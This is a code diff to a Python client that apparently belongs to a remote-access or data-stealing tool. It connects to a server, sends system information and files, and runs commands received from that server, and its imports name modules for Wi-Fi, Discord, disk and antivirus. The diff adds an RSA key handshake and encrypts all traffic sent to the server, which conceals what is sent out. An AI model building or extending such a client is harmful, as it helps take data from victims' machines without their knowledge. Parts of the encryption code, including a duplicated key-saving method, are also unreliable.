@@ -7,6 +7,8 @@ import uuid
 import psutil
 import sys
 import threading
+import base64
+import rsa
 
 from modules import wifi
 from modules.discord import discord
@@ -16,15 +18,17 @@ from modules.disk import disk
 from modules.antivirus import antivirus
 from common import utils
 from client.handlers import CommandHandler
-from client_types.message import MESSAGE_TYPE_CONNECTION, MESSAGE_TYPE_PING, Message
-
+from client_types.message import MESSAGE_TYPE_CONNECTION, MESSAGE_TYPE_PING, Message, MESSAGE_TYPE_CONNECT
+from modules._sec._sec import Sec
 
 class Client:
     """Client class to represent a client that connects to the server."""
     def __init__(self, server_address: tuple[str, int], command_handler: CommandHandler) -> None:
         self.server_address = server_address
         self.command_handler = command_handler
+        self.sec = Sec()
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
         self.connect_to_server()
         self.send_system_info()
 
@@ -35,6 +39,21 @@ class Client:
         """Connect to the server."""
         try:
             self.client.connect(self.server_address)
+
+            self.send(json.dumps(Message(type=MESSAGE_TYPE_CONNECT, json_data={"uuid": str(uuid.UUID(int=uuid.getnode()))}).to_dict()))
+
+            response = self.receive()
+            handshake = json.loads(response)
+            if handshake["type"] == "handshake":
+                self.sec.save_public_key(handshake["json_data"]["public_key"])
+                self.sec.load_public_key()
+                print(f"Connected to server at {self.server_address} HANDSHAKE")
+            elif handshake["type"] == "ack":
+                self.sec.load_public_key()
+                print(f"Connected to server at {self.server_address} ACK")
+            else:
+                print(f"Failed to connect to server at {self.server_address}: {handshake['error']}")
+                sys.exit(1)
         except Exception as e:
             print(f"Failed to connect to server at {self.server_address}: {e}")
             sys.exit(1)
@@ -83,16 +102,29 @@ class Client:
 
     def send(self, data: str, chunk_size: int = 2048) -> None:
         """Send data to the server with a fixed-length header."""
-        header = json.dumps({
+        encryptedData = self.sec.encrypt(data)
+        if encryptedData:
+            header = json.dumps({
             "type": "JSON",
-            "total_size": len(data),
-        })
-        header_length = len(header).to_bytes(4, 'big')  # 4-byte fixed-length prefix
-        self.client.sendall(header_length + header.encode('utf-8'))
+            "total_size": len(encryptedData),
+            })
+            header_length = len(header).to_bytes(4, 'big')  # 4-byte fixed-length prefix
+            self.client.sendall(header_length + header.encode('utf-8'))
 
-        for i in range(0, len(data), chunk_size):
-            chunk = data[i:i+chunk_size].encode('utf-8')
-            self.client.sendall(chunk)
+            for i in range(0, len(encryptedData), chunk_size):
+                chunk = encryptedData[i:i+chunk_size]
+                self.client.sendall(chunk)
+        else:
+            header = json.dumps({
+                "type": "JSON",
+                "total_size": len(data),
+            })
+            header_length = len(header).to_bytes(4, 'big')  # 4-byte fixed-length prefix
+            self.client.sendall(header_length + header.encode('utf-8'))
+
+            for i in range(0, len(data), chunk_size):
+                chunk = data[i:i+chunk_size].encode('utf-8')
+                self.client.sendall(chunk)
 
     def send_file(self, file_path: str, chunk_size: int = 1024) -> None:
         """Send a file to the server with metadata and chunked content."""
@@ -133,7 +165,6 @@ class Client:
         except Exception as e:
             print(f"An unexpected error occurred: {e}")
 
-
     def receive(self) -> str:
         chunks = []
         while True:
@@ -172,3 +203,24 @@ class Client:
 
     def close(self) -> None:
         self.client.close()
+
+    def save_public_key(self, public_key_base64) -> None:
+        """
+        Save the server's public key received in the handshake.
+        """
+        try:
+            # Decode the base64 public key
+            public_key_pem = base64.b64decode(public_key_base64)
+
+            # Save the public key to a file for future use
+            key_file = "server_public_key.pem"
+            with open(key_file, "wb") as f:
+                f.write(public_key_pem)
+            print(f"Public key saved to {key_file}")
+
+            # Load the key using rsa library
+            self.server_public_key = rsa.PublicKey.load_pkcs1(public_key_pem)
+            print("Public key successfully loaded.")
+        except Exception as e:
+            print(f"Failed to save or load public key: {e}")
+            raise
